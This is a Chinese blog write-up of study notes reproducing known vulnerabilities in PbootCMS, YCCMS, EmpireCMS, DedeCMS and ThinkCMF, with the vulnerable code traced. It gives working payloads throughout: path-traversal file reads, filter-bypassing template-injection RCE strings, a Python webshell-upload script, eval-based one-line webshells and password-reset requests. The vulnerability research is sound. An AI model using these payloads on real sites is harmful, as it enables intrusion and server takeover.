title: CMS漏洞复现
author: bmth
tags:
  - 漏洞复现
  - 学习笔记
  - ''
categories: []
img: 'https://img-blog.csdnimg.cn/202107040018284.png'
date: 2021-07-04 00:10:00
---
>phpstorm使用方法
>shift+shift    搜索类
>ctrl+shift+f  全局搜索

## PbootCMS
安装教程百度一下就有的
### PbootCMS-V2.0.7
#### 任意文件读取
漏洞发生在 `core/view/view.php`中的parser函数
```php
    public function parser($file)
    {
        // 设置主题
        $theme = isset($this->vars['theme']) ? $this->vars['theme'] : 'default';
        
        $theme = preg_replace('/\.\.(\/|\\\)/', '', $theme); // 过滤掉相对路径
        $file = preg_replace('/\.\.(\/|\\\)/', '', $file); // 过滤掉相对路径
        
        if (strpos($file, '/') === 0) { // 绝对路径模板
            $tpl_file = ROOT_PATH . $file;
        } elseif (! ! $pos = strpos($file, '@')) { // 跨模块调用
            $path = APP_PATH . '/' . substr($file, 0, $pos) . '/view/' . $theme;
            define('APP_THEME_DIR', str_replace(DOC_PATH, '', $path));
            if (! is_dir($path)) { // 检查主题是否存在
                error('模板主题目录不存在！主题路径：' . $path);
            } else {
                $this->tplPath = $path;
            }
            $tpl_file = $path . '/' . substr($file, $pos + 1);
        } else {
            // 定义当前应用主题目录
            define('APP_THEME_DIR', str_replace(DOC_PATH, '', APP_VIEW_PATH) . '/' . $theme);
            if (! is_dir($this->tplPath .= '/' . $theme)) { // 检查主题是否存在
                error('模板主题目录不存在！主题路径：' . APP_THEME_DIR);
            }
            $tpl_file = $this->tplPath . '/' . $file; // 模板文件
        }
        $note = Config::get('tpl_html_dir') ? '<br>同时检测到您系统中启用了模板子目录' . Config::get('tpl_html_dir') . '，请核对是否是此原因导致！' : '';
        file_exists($tpl_file) ?: error('模板文件' . APP_THEME_DIR . '/' . $file . '不存在！' . $note);
        $tpl_c_file = $this->tplcPath . '/' . md5($tpl_file) . '.php'; // 编译文件
                                                                       
        // 当编译文件不存在，或者模板文件修改过，则重新生成编译文件
        if (! file_exists($tpl_c_file) || filemtime($tpl_c_file) < filemtime($tpl_file) || ! Config::get('tpl_parser_cache')) {
            $content = Parser::compile($this->tplPath, $tpl_file); // 解析模板
            file_put_contents($tpl_c_file, $content) ?: error('编译文件' . $tpl_c_file . '生成出错！请检查目录是否有可写权限！'); // 写入编译文件
            $compile = true;
        }
        
        ob_start(); // 开启缓冲区,引入编译文件
        $rs = include $tpl_c_file;
        if (! isset($compile)) {
            foreach ($rs as $value) { // 检查包含文件是否更新,其中一个包含文件不存在或修改则重新解析模板
                if (! file_exists($value) || filemtime($tpl_c_file) < filemtime($value) || ! Config::get('tpl_parser_cache')) {
                    $content = Parser::compile($this->tplPath, $tpl_file); // 解析模板
                    file_put_contents($tpl_c_file, $content) ?: error('编译文件' . $tpl_c_file . '生成出错！请检查目录是否有可写权限！'); // 写入编译文件
                    ob_clean();
                    include $tpl_c_file;
                    break;
                }
            }
        }
        $content = ob_get_contents();
        ob_end_clean();
        return $content;
    }
```
```php
$file = preg_replace('/\.\.(\/|\\\)/', '', $file); // 过滤掉相对路径
```
可以看到过滤了`../`和`\`，但是可以双写绕过
![](https://img-blog.csdnimg.cn/20210703162823166.png)
当模板文件不在缓存中的时候，会读取`$tpl_file`中的内容，然后写入缓存文件中并且包含
也就是说，当parser函数的参数可以被控制的时候，就会造成一个任意文件包含
所以，要找一个可控参数的parser调用

发现`apps/home/controller/SearchController.php`
![](https://img-blog.csdnimg.cn/20210703163225808.png)存在parser，并且searchtpl可控
`?search=&searchtpl=....//....//....//....//....//....//....//....//etc/passwd`
![](https://img-blog.csdnimg.cn/20210703160519600.png)
还存在前台控制器`apps/home/controller/TagController.php`
![](https://img-blog.csdnimg.cn/2021070316355037.png)
```php
$content = parent::parser($this->htmldir . $tagstpl); // 框架标签解析
```
虽然这个`$content`前面被拼接了`$this->htmldir`，但是函数内部可以出现目录穿越，所以`$this->htmldir`这个路径并不影响。也就是说他是在生成编译文件时穿越的
![](https://img-blog.csdnimg.cn/20210703161056751.png)
参考：[PbootCMS2.07前台任意文件包含漏洞(复现) ](https://www.cnblogs.com/wangtanzhi/p/12930074.html)

#### 前台RCE
**但是需要在后台设置将留言内容显示**
在`apps/api/controller/CmsController.php`中的addmsg函数中
![](https://img-blog.csdnimg.cn/2021070318052481.png)
存在第一个过滤，双写即可绕过
在`apps/home/controller/ParserController.php`的parserIfLabel函数解析if标签
```php
    public function parserIfLabel($content)
    {
        $pattern = '/\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
        $pattern2 = '/pboot:([0-9])+if/';
        if (preg_match_all($pattern, $content, $matches)) {
            $count = count($matches[0]);
            for ($i = 0; $i < $count; $i ++) {
                $flag = '';
                $out_html = '';
                $danger = false;
                
                $white_fun = array(
                    'date',
                    'in_array',
                    'explode',
                    'implode'
                );
                
                // 还原可能包含的保留内容，避免判断失效
                $matches[1][$i] = $this->restorePreLabel($matches[1][$i]);
                
                // 解码条件字符串
                $matches[1][$i] = decode_string($matches[1][$i]);
                
                // 带有函数的条件语句进行安全校验
                if (preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches[1][$i], $matches2)) {
                    foreach ($matches2[1] as $value) {
                        if ((function_exists($value) || preg_match('/^eval$/i', $value)) && ! in_array($value, $white_fun)) {
                            $danger = true;
                            break;
                        }
                    }
                }
                
                // 过滤特殊字符串
                if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i', $matches[1][$i])) {
                    $danger = true;
                }
                
                // 如果有危险函数，则不解析该IF
                if ($danger) {
                    continue;
                }
                
                eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
                if (preg_match('/([\s\S]*)?\{else\}([\s\S]*)?/', $matches[2][$i], $matches2)) { // 判断是否存在else
                    switch ($flag) {
                        case 'if': // 条件为真
                            if (isset($matches2[1])) {
                                $out_html = $matches2[1];
                            }
                            break;
                        case 'else': // 条件为假
                            if (isset($matches2[2])) {
                                $out_html = $matches2[2];
                            }
                            break;
                    }
                } elseif ($flag == 'if') {
                    $out_html = $matches[2][$i];
                }
                
                // 无限极嵌套解析
                if (preg_match($pattern2, $out_html, $matches3)) {
                    $out_html = str_replace('pboot:' . $matches3[1] . 'if', 'pboot:if', $out_html);
                    $out_html = str_replace('{' . $matches3[1] . 'else}', '{else}', $out_html);
                    $out_html = $this->parserIfLabel($out_html);
                }
                
                // 执行替换
                $content = str_replace($matches[0][$i], $out_html, $content);
            }
        }
        return $content;
    }
```
在函数名和括号间可以插入控制字符[\x00-\x20]，PHP引擎会忽略这些控制字符，那么就可以绕过这个正则了
```php
preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches[1][$i], $matches2)
```
这里在`core/basic/Model.php`，多加了一层过滤，也可以双写绕过
![](https://img-blog.csdnimg.cn/20210703180042504.png)
```php
{pbootpbootpboot:if:if:if(implode('', ['c','a','l','l','_','u','s','e','r','_','f','u','n','c'])(implode('',['p','h','p','i','n','f','o'])))}!!!{/pbootpbootpboot:if:if:if}
```
![](https://img-blog.csdnimg.cn/20210703180644106.png)
成功得到phpinfo，那么尝试rce
![](https://img-blog.csdnimg.cn/20210703180725195.png)
可以任意文件读取，但由于禁用了函数，需要使用无参数rce的方法
```php
{pbootpbootpboot:if:if:if(array_filter (['whoami'],session_id (session_start ())))}!!!{/pbootpbootpboot:if:if:if}
```
![](https://img-blog.csdnimg.cn/2021070319213569.png)
那么就可以写入一句话木马了


参考：[从PbootCMS审计到某狗绕过](https://www.freebuf.com/articles/web/253403.html)
#### 后台模板注入
同样是使用了parserIfLabel函数，在后台的基础内容、站点信息可以成功解析`{pboot:if(1)}OK{/pboot:if}`
![](https://img-blog.csdnimg.cn/20210703212414207.png)
这里使用另一种无参数rce，使用的getallheaders()
```php
{pboot:if(call_user_func (next (getallheaders ()),next (array_reverse (getallheaders ()))))}test{pboot:if}
```
![](https://img-blog.csdnimg.cn/20210703212143933.png)

参考：[PbootCMS v2.0.9 远程代码执行漏洞](https://www.hacking8.com/bug-web/PbootCMS/PbootCMS-v2.0.9-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html)

## YCCMS_v3.4
直接安装就可以了
### 越权修改管理员账号密码
在`/admin/?a=admin&m=update`处，未对用户的身份进行验证，导致可以直接修改管理员密码
```
username=admin&password=123456&notpassword=123456&send=%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81
```
![](https://img-blog.csdnimg.cn/20210704153832532.png)
漏洞在`controller/AdminAction.class.php`
```php
	public function update(){
		if(isset($_POST['send'])){
			if(validate::isNullString($_POST['username'])) Tool::t_back('用户名不能为空','?a=admin&m=update');
			if(validate::isNullString($_POST['password'])) Tool::t_back('密码不能为空!','?a=admin&m=update');
			if(!(validate::checkStrEquals($_POST['password'], $_POST['notpassword']))) Tool::t_back('两次密码不一致!','?a=admin&m=update');
			$this->_model->username=$_POST['username'];
			$this->_model->password=sha1($_POST['password']);
			$_edit=$this->_model->editAdmin();
			if($_edit){
				tool::layer_alert('密码修改成功!','?a=admin&m=update',6);
				}else{
				tool::layer_alert('密码未修改!','?a=admin&m=update',6);
			}
		}
		
			$this->_tpl->assign('admin', $_SESSION['admin']);
			$this->_tpl->display('admin/public/update.tpl');
	}
```
发现前面都是获取参数，这里跳转`$_edit=$this->_model->editAdmin();`
然后到`model/AdminModel.class.php`中的
![](https://img-blog.csdnimg.cn/20210704154303858.png)
发现`$_sql`那么跟进update，在`model/Model.class.php`发现
![](https://img-blog.csdnimg.cn/20210704154408579.png)

```php
	protected function execute($_sql){
		try{
			$_stmt=$this->_db->prepare($_sql);
			$_stmt->execute();
		}catch (PDOException $e){
			exit('SQL语句:'.$_sql.'<br />错误信息:'.$e->getMessage());
		}
		return $_stmt;
	}
```
发现直接执行了sql语句，但并没有判断用户身份，导致可以越权修改密码

### 文件上传(一)
只有在后台才可以上传文件的，但由于没有对用户身份进行验证导致后台能做的我们都能做
![](https://img-blog.csdnimg.cn/20210704155009441.png)
发现需要验证Content-Type，使用python或者抓包直接修改即可
```python
import requests

url = 'http://192.168.111.133/cms/yccms/admin/?a=call&m=upLoad'

payload = {
    'send':'确定上传'
}

file = open("bmth.php","r") #一句话木马路径
files = {'pic': ('bmth.php',file,'image/png'),}

r = requests.post(url,data=payload,files=files)

print(r.text)
```
![](https://img-blog.csdnimg.cn/20210704160113429.png)
跟进函数upload，在`controller/CallAction.class.php`
![](https://img-blog.csdnimg.cn/20210704160336201.png)
根据LogoUpload跟进到`public/class/LogoUpload.class.php`这里定义了上传文件的类型为png或x-png
![](https://img-blog.csdnimg.cn/20210704162251431.png)
发现首先验证文件类型和目录，然后移动文件到images目录下并将文件名前缀改为logo，并未判断用户权限，导致可以上传php文件getshell

### 文件上传(二)
在后台的修改文章处可以使用编辑器上传图片
![](https://img-blog.csdnimg.cn/20210704162748652.png)
同样在`controller/CallAction.class.php`
![](https://img-blog.csdnimg.cn/20210704162843349.png)
跟进FileUpload，漏洞在`/public/class/FileUpload.class.php`
![](https://img-blog.csdnimg.cn/2021070416302593.png)
一样的问题，只检测了上传文件的类型，但是发现返回值还是：**警告：此图片类型本系统不支持！**
哎，只能在后台的图片管理处查看图片得到路径了，这里图片名为：
```php
$_newname = date('YmdHis').mt_rand(100,1000).'.'.$_postfix;
```
前面的时间戳已知，也可以爆破后三位得到图片路径
![](https://img-blog.csdnimg.cn/20210704172325473.png)
参考：[YCCMS 代码审计](https://blog.csdn.net/qq_45742511/article/details/116664586)

## EmpireCMS 7.5(帝国cms)
直接安装即可，没有问题
### 配置文件写入
该漏洞是由于安装程序时没有对用户的输入做严格过滤,导致用户输入的可控参数被写入配置文件,造成任意代码执行漏洞。
![](https://img-blog.csdnimg.cn/20210704233242912.png)
再次访问安装结束的页面，`/e/install/?enews=moddata&f=4&ok=1&defaultdata=1`
![](https://img-blog.csdnimg.cn/20210704233527615.png)
查看config.php发现成功写入一句话
![](https://img-blog.csdnimg.cn/20210704233705337.png)
这里首先查看`e/install/index.php`，发现将获取表名前缀交给了mydbtbpre参数
![](https://img-blog.csdnimg.cn/20210705083134126.png)
然后会执行
```php
if($enews=="setdb"&&$ok)
{
	SetDb($_POST);
}
```
那么跟踪发现在`e/install/data/fun.php`中存在SetDb函数，并调用了RepEcmsConfig和DoRunQuery，期间并未进行任何过滤
![](https://img-blog.csdnimg.cn/20210705085654449.png)
RepEcmsConfig函数将配置数据包含可控的表前缀一起写入到config.php配置文件
![](https://img-blog.csdnimg.cn/20210705084843492.png)
DoRunQuery传递了$mydbtbpre参数
发现函数将用户前端输入的表前缀（默认phome_）替换掉默认的phome_后带入了sql语句中进行表的创建
![](https://img-blog.csdnimg.cn/20210705084013324.png)
那么就是没有检测导致将payload写入到配置文件中触发的漏洞了，感觉比较鸡肋，还需要安装~~
### 后台getshell(一)
在栏目，自定义页面，增加自定义页面处可以getshell，测试发现页面为静态页面，那么直接写入webshell试试
![](https://img-blog.csdnimg.cn/20210705095223319.png)
成功在网站根目录写入webshell
![](https://img-blog.csdnimg.cn/20210705095121449.png)
首先在`e/admin/ecmscom.php`页面看到
![](https://img-blog.csdnimg.cn/20210705100958641.png)

那么跟踪AddUserpage，跳转到`e/class/comdofun.php`，发现获取了我们传入的路径和内容
![](https://img-blog.csdnimg.cn/20210705101723834.png)
漏洞在`e/class/functions.php`，可以看到将我们传入的`$pagetext`进行RepPhpAspJspcode函数过滤了
![](https://img-blog.csdnimg.cn/20210705102056887.png)
但是candocode为真，那么不存在过滤，然后执行了ReUserpage函数，跟进发现首先建目录
![](https://img-blog.csdnimg.cn/20210705102611270.png)
然后看到如果不使用模板式，那么我们传入的文件内容变为了`$pagestr`，之后进行了InfoNewsBq操作，看一下
```php
//标签替换2
function InfoNewsBq($classid,$indextext){
	global $empire,$dbtbpre,$public_r,$emod_r,$class_r,$class_zr,$fun_r,$navclassid,$navinfor,$class_tr,$level_r,$etable_r;
	if(!defined('EmpireCMSAdmin'))
	{
		$_GET['reallinfotime']=0;
	}
	if($_GET['reallinfotime'])
	{
		$classid.='_all';
	}
	$file=eReturnTrueEcmsPath().'e/data/tmp/temp'.$classid.'.php';
	if($_GET['reallinfotime']&&file_exists($file))
	{
		$filetime=filemtime($file);
		if($_GET['reallinfotime']<=$filetime)
		{
			ob_start();
			include($file);
			$string=ob_get_contents();
			ob_end_clean();
			$string=RepExeCode($string);//解析代码
			return $string;
		}
	}
	$indextext=stripSlashes($indextext);
	$indextext=ReplaceTempvar($indextext);//替换全局模板变量
	//替换标签
	$indextext=DoRepEcmsLoopBq($indextext);
	$indextext=RepBq($indextext);
	//写文件
	WriteFiletext($file,AddCheckViewTempCode().$indextext);
	//读取文件内容
    ob_start();
	include($file);
	$string=ob_get_contents();
	ob_end_clean();
	$string=RepExeCode($string);//解析代码
	return $string;
}
```
可以看到先进行了一个写文件的函数WriteFiletext，然后存在一个包含`include($file);`，存在文件包含啊，直接包含我们的payload即可，那么说明不需要后缀是php也可以，测试发现确实如此

### 后台getshell(二)
在系统、数据表与系统模型、管理数据表、导入系统模型中，上传我们的1.php.mod
![](https://img-blog.csdnimg.cn/20210705104009908.png)
内容为：(注意需要对$进行转义)
```php
<?php file_put_contents("../../caidao.php","<?php @eval(\$_POST[cmd]);?>");?>
```
![](https://img-blog.csdnimg.cn/20210705104154610.png)
显示导入模型成功，那么访问我们的一句话木马路径即可getshell
![](https://img-blog.csdnimg.cn/2021070510424133.png)
在`e/admin/ecmsmod.php`存在导入模型，然后跟进LoadInMod函数
![](https://img-blog.csdnimg.cn/20210705113227791.png)
```php
//导入系统模型
function LoadInMod($add,$file,$file_name,$file_type,$file_size,$userid,$username){
	global $empire,$dbtbpre,$ecms_config;
	//验证权限
	CheckLevel($userid,$username,$classid,"table");
	$tbname=RepPostVar(trim($add['tbname']));
	if(!$file_name||!$file_size||!$tbname)
	{
		printerror("EmptyLoadInMod","");
	}
	//扩展名
	$filetype=GetFiletype($file_name);
	if($filetype!=".mod")
	{
		printerror("LoadInModMustmod","");
	}
	//表名是否已存在
	$num=$empire->gettotal("select count(*) as total from {$dbtbpre}enewstable where tbname='$tbname' limit 1");
	if($num)
	{
		printerror("HaveLoadInTb","");
	}
	//上传文件
	$path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";
	$cp=@move_uploaded_file($file,$path);
	if(!$cp)
	{
		printerror("EmptyLoadInMod","");
	}
	DoChmodFile($path);
	@include($path);
	UpdateTbDefMod($tid,$tbname,$mid);
	//公共变量
	TogSaveTxtF(1);
	GetConfig(1);//更新缓存
	//生成模型表单文件
	$modr=$empire->fetch1("select mtemp,qmtemp,cj from {$dbtbpre}enewsmod where mid='$mid'");
	ChangeMForm($mid,$tid,$modr[mtemp]);//更新表单
	ChangeQmForm($mid,$tid,$modr[qmtemp]);//更新前台表单
	ChangeMCj($mid,$tid,$modr[cj]);//采集表单
	//删除文件
	DelFiletext($path);
	//操作日志
	insert_dolog("tid=$tid&tb=$tbname<br>mid=$mid");
	printerror("LoadInModSuccess","db/ListTable.php".hReturnEcmsHashStrHref2(1));
}
```
发现图片路径为加密的
```php
$path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";
```
但是又存在一个`@include($path);`，导致包含我们的payload即可写入webshell

### 后台getshell(三)
在系统、备份与恢复数据、备份数据
![](https://img-blog.csdnimg.cn/20210705121604571.png)
点击开始备份处，进行抓包修改`tablename[]=system($_POST[0])`
![](https://img-blog.csdnimg.cn/20210705121720721.png)
最后访问备份目录下的config.php
![](https://img-blog.csdnimg.cn/20210705121503983.png)

在`e/admin/ebak/phome.php`
![](https://img-blog.csdnimg.cn/20210705135346417.png)
发现备份函数Ebak_DoEbak，跟进，漏洞在`e/admin/ebak/class/functions.php`
这里将数据库表名传递给变量`$tablename`，并计算个数
![](https://img-blog.csdnimg.cn/20210705135940777.png)
然后使用RepPostVar函数对参数进行处理，最后遍历表名并赋值给`$b_table`、`$d_table`，其中`$d_table`拼接成`$tb`数组时没有对键值名添加双引号，又由于键值可控，我们可以使用`$tb[phpinfo()]=0;`这样的方式getshell
![](https://img-blog.csdnimg.cn/20210705135923845.png)

![](https://img-blog.csdnimg.cn/20210705140339825.png)

最后写入`$string`到config.php
![](https://img-blog.csdnimg.cn/20210705140924266.png)
最后查看一下config.php的内容，发现成功写入
![](https://img-blog.csdnimg.cn/20210705142106312.png)

参考：
[EmpireCMS_V7.5的一次审计](https://bbs.ichunqiu.com/thread-46685-1-1.html)
[帝国CMS(EmpireCMS) v7.5后台任意代码执行](https://www.shuzhiduo.com/A/pRdBPopGJn/)
>最后还可以通过执行sql语句写文件getshell，但是需要开启`--secure-file-priv`，就不复现了
>参考：[【漏洞复现】帝国CMS(EmpireCMS) v7.5 代码注入分析(CVE-2018-19462)](https://blog.catgames.cn/post/112.html)


## DedeCMS(织梦cms)
### DedeCMS v5.7
直接安装即可，就是貌似识别不了gd库
![](https://img-blog.csdnimg.cn/20210706130808276.png)
发现我登录不了后台，因为php5.6的版本不支持`session_register`，[安装dedecms后台登录空白的解决方法](https://www.cnblogs.com/haocool/archive/2012/10/21/2732976.html)，修改即可

#### 前台任意修改密码
首先访问
```
/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=2
```
抓包得到关键的key
![](https://img-blog.csdnimg.cn/20210706153945728.png)
然后访问`/member/resetpassword.php?dopost=getpasswd&id=2&key=SaLw78SY`，进行修改密码
![](https://img-blog.csdnimg.cn/20210706155016847.png)
首先跟进到`member/resetpassword.php`
![](https://img-blog.csdnimg.cn/20210706191508526.png)
漏洞在`$row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer`，默认`$row['safequestion']`在数据中的内容为0，而`$row['safeanswer']`在数据库中的结果为空，所以不用管，又因为使用了==弱类型，那么直接传入0.0，也可以使用 0. 、 0e1使得参数弱等于0并且不为空。
发现判断成功的话会执行sn函数，在`member/inc/inc_pwd_functions.php`
![](https://img-blog.csdnimg.cn/20210706193031693.png)
发现调用了newmail函数，跟进发现
![](https://img-blog.csdnimg.cn/2021070619321722.png)
存在一个`$randval = random(8);`为随机的8位，进入INSERT，`$key = md5($randval);`为md5的值，并插入了数据库，然后判断`$send`为N，那么就会执行ShowMsg输出url，并且这个url带着key
返回来看重置密码处
![](https://img-blog.csdnimg.cn/20210706193903949.png)
发现`$row['pwd'] == $sn`会验证key值，然后就会UPDATE用户的密码，即可修改密码了

#### 后台文件写入
登录后台直接访问
```
/dede/tpl.php?filename=1.lib.php&action=savetagfile&content=<?php eval($_POST[cmd]);?>
```
![](https://img-blog.csdnimg.cn/20210706210537739.png)
即可得到shell
```
/include/taglib/1.lib.php
```
![](https://img-blog.csdnimg.cn/20210706204710805.png)
漏洞在`dede/tpl.php`中的保存标签碎片修改
![](https://img-blog.csdnimg.cn/20210706205000771.png)
发现文件需要后缀为.lib.php，然后用了stripslashes来删除content中的反斜杠，最后就直接fwrite写文件了，并没有任何检测

#### 后台getshell
在模块、广告管理、增加广告位置的广告内容处写入一句话
![](https://img-blog.csdnimg.cn/20210706215255757.png)
查看在调用广告的文件，可以看到，在ad_js.php文件调用了广告
![](https://img-blog.csdnimg.cn/20210706215359475.png)
POST传参，发现在网页的源码中发现了执行代码的结果
![](https://img-blog.csdnimg.cn/20210706215728915.png)
在`dede/ad_add.php`中
```php
<?php
/**
 * 广告添加
 *
 * @version        $Id: ad_add.php 1 8:26 2010年7月12日Z tianya $
 * @package        DedeCMS.Administrator
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.dedecms.com
 */
 
require(dirname(__FILE__)."/config.php");
CheckPurview('plus_广告管理');
require_once DEDEINC."/typelink.class.php";
if(empty($dopost)) $dopost = "";

if($dopost=="save")
{
    //timeset tagname typeid normbody expbody
    $tagname = trim($tagname);
    $row = $dsql->GetOne("SELECT typeid FROM #@__myad WHERE typeid='$typeid' AND tagname LIKE '$tagname'");
    if(is_array($row))
    {
        ShowMsg("在相同栏目下已经存在同名的标记！","-1");
        exit();
    }
    $starttime = GetMkTime($starttime);
    $endtime = GetMkTime($endtime);
    $link = addslashes($normbody['link']);
    if($normbody['style']=='code')
    {
        $normbody = addslashes($normbody['htmlcode']);
    }
    else if($normbody['style']=='txt')
    {
        
        $normbody = "<a href=\"{$link}\" font-size=\"{$normbody['size']}\" color=\"{$normbody['color']}\">{$normbody['title']}</a>";
    }
    else if($normbody['style']=='img')
    {
        if(empty($normbody['width']))
        {
            $width = "";
        }
        else
        {
            $width = " width=\"{$normbody['width']}\"";
        }
        if (empty($normbody['height']))
        {
            $height = "";
        }
        else
        {
            $height = "height=\"{$normbody['height']}\"";
        }
        $normbody = "<a href=\"{$link}\"><img src=\"{$normbody['url']}\"$width $height border=\"0\" /></a>";
    }
    else
    {
        if(empty($normbody['width']))
        {
            $width = "";
        }
        else
        {
            $width = " width=\"{$normbody['width']}\"";
        }
        if (empty($normbody['height']))
        {
            $height = "";
        }
        else
        {
            $height = "height=\"{$normbody['height']}\"";
        }
        $normbody = "<object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.Macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0\"$width $height><param name=\"movie\" value=\"{$link}\"/><param name=\"quality\" value=\"high\"/></object>";
    }
    $query = "
     INSERT INTO #@__myad(clsid,typeid,tagname,adname,timeset,starttime,endtime,normbody,expbody)
     VALUES('$clsid','$typeid','$tagname','$adname','$timeset','$starttime','$endtime','$normbody','$expbody');
    ";
    $dsql->ExecuteNoneQuery($query);
    ShowMsg("成功增加一个广告！","ad_main.php");
    exit();
}
$dsql->Execute('dd','SELECT * FROM `#@__myadtype` ORDER BY id DESC');
$option = '';
while($arr = $dsql->GetArray('dd'))
{
    $option .= "<option value='{$arr['id']}'>{$arr['typename']}</option>\n\r";
}
$startDay = time();
$endDay = AddDay($startDay,30);
$startDay = GetDateTimeMk($startDay);
$endDay = GetDateTimeMk($endDay);
include DedeInclude('templets/ad_add.htm');
```
`$normbody = addslashes($normbody['htmlcode']);`，就转义了一下双引号，没有对输入的参数htmlcode进行其他过滤，导致可以嵌入恶意代码，然后插入到数据库中
![](https://img-blog.csdnimg.cn/20210706221143829.png)
然后在`plus/ad_js.php`处进行写入
![](https://img-blog.csdnimg.cn/20210706221357118.png)
将我们的payload写入到`$cacheFile = DEDEDATA.'/cache/myad-'.$aid.'.htm';`，然后`include $cacheFile;`
![](https://img-blog.csdnimg.cn/20210706222059604.png)

>织梦cms的后台能利用的点太多了，所以说拿到后台基本上服务器权限也有了

参考：[DeDeCMS-v5.7-漏洞分析 ](https://www.cnblogs.com/thresh/p/13743219.html)
[DeDecms(织梦CMS) V5.7.72任意用户密码重置漏洞复现 ](https://www.cnblogs.com/wangtanzhi/p/12813642.html)
## ThinkCMF
[ThinkCMF 高危漏洞分析与利用](https://www.secpulse.com/archives/146498.html)
### ThinkCMF X2.2.2
直接安装就可以了
首先分析一下为什么用a这个参数吧，在`application/Common/Conf/config.php`发现参数a定义给了VAR_ACTION
![](https://img-blog.csdnimg.cn/20210707150621618.png)
从最先进入的`index.php`开始，发现项目路径
![](https://img-blog.csdnimg.cn/20210707141659767.png)
然后载入了框架核心文件
![](https://img-blog.csdnimg.cn/20210707141943591.png)
在`simplewind/Core/ThinkPHP.php`中，发现应用初始化，调用了Think类的start方法
![](https://img-blog.csdnimg.cn/20210707141903518.png)
跟进在`simplewind/Core/Library/Think/Think.class.php`文件中，最后调用了App类中的run方法
![](https://img-blog.csdnimg.cn/20210707142231414.png)

继续跟进`simplewind/Core/Library/Think/App.class.php`，发现调用了**APP::init()** 和 **APP::exec()**
![](https://img-blog.csdnimg.cn/20210707154042200.png)
查看init方法，发现了URL调度
![](https://img-blog.csdnimg.cn/20210707142423437.png)
在`simplewind/Core/Mode/Api/Dispatcher.class.php`，可以看到将a赋值给了`$varAction`
![](https://img-blog.csdnimg.cn/20210707150652975.png)
```php
    static private function getAction($var,$urlCase) {
        $action   = !empty($_POST[$var]) ?
            $_POST[$var] :
            (!empty($_GET[$var])?$_GET[$var]:C('DEFAULT_ACTION'));
        unset($_POST[$var],$_GET[$var]);
        return strip_tags($urlCase?strtolower($action):$action);
    }
```
然后调用了 getAction 这个静态方法，可以看到action的值就是用参数 a 传入的，也就是说通过 a 传入的是要被执行的方法
![](https://img-blog.csdnimg.cn/2021070715112650.png)
#### 任意文件包含
`?a=display&templateFile=README.md`
![](https://img-blog.csdnimg.cn/20210707141032533.png)
由于使用的是Portal应用，看到`application/Common/Controller/HomebaseController.class.php`中的display函数
![](https://img-blog.csdnimg.cn/20210707160617754.png)
然后 **parent::display** 返回到其父类的`simplewind/Core/Library/Think/Controller.class.php`文件中的display方法
![](https://img-blog.csdnimg.cn/20210707161140340.png)
跟进到`simplewind/Core/Library/Think/View.class.php`中的display方法
![](https://img-blog.csdnimg.cn/20210707162358829.png)
发现调用了fetch方法，在起始有一个`ob_start();`，然后进入到view_parase模块，最后通过`$content = ob_get_clean();`将content清空
![](https://img-blog.csdnimg.cn/20210707162617285.png)
这里 **Hook::listen** 函数就相当于是调用了一个提前注册好的类中的函数，函数默认是run函数，可以在`simplewind/Core/Mode/common.php`看到
![](https://img-blog.csdnimg.cn/20210707163026602.png)
那么到`simplewind/Core/Library/Behavior/ParseTemplateBehavior.class.php`中的run入口处，`$_content`为我们传入的文件名
>发现content的值是第一次发送的话，将会走else分支，如果不是第一次发送，将会走第一个分支，从判断条件也可得知，如果缓存中存在content的缓存，即走if分支，否则就走else分支

![](https://img-blog.csdnimg.cn/20210707164848193.png)
利用第一次发送的poc，进入到else分支中的fetch函数，发现进入到`simplewind/Core/Library/Think/Template.class.php`文件中的fetch函数，漏洞就在这里
![](https://img-blog.csdnimg.cn/20210707165021170.png)
看到loadTemplate方法，先读取目标文件内容，然后目标文件内容会使用 **Storage::put** 写入到缓存文件里
![](https://img-blog.csdnimg.cn/20210707173323236.png)
接着用 **Storage::load** 函数将缓存文件进行包含，发现传入的文件名并没有经过检查，因此可以包含任意文件

#### 任意代码执行
```php
?a=fetch&templateFile=public/index&prefix=''&content=<?php file_put_contents('2.php','<?php @eval($_POST[cmd]); ?>')?>
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('2.php','<?php @eval($_POST[cmd]); ?>')</php>
```
![](https://img-blog.csdnimg.cn/20210707184616869.png)
从`application/Common/Controller/HomebaseController.class.php`开始
![](https://img-blog.csdnimg.cn/20210707180656380.png)
然后通过`return parent::fetch`返回到其父类的的fetch()函数，后面都是一样的，直到
```php
$tmplContent =  $this->compiler($tmplContent);
```
![](https://img-blog.csdnimg.cn/20210707190156680.png)
发现会经过一大串过滤，然后`$tmplContent `经过编译后通过 **Storage::put** 函数保存，注意这里不能直接写入函数，必须加上php前缀`<?php`，不然代码就变为了：
```php
<?php if (!defined('THINK_PATH')) exit();?>file_put_contents('2.php','<?php @eval($_POST[cmd]); ?>')
```
从而无法解析我们的代码导致不生效，然后发现`<php>`也是可以生效的

最终将文件生成到data/runtime/Cache/Portal文件夹中，然后调用了 **Storage::load** 加载cache文件，那么即可生成webshell了
![](https://img-blog.csdnimg.cn/20210707191519981.png)
#### 前台任意文件上传
首先随便注册一个用户，登录获取Cookie
![](https://img-blog.csdnimg.cn/20210707200325172.png)
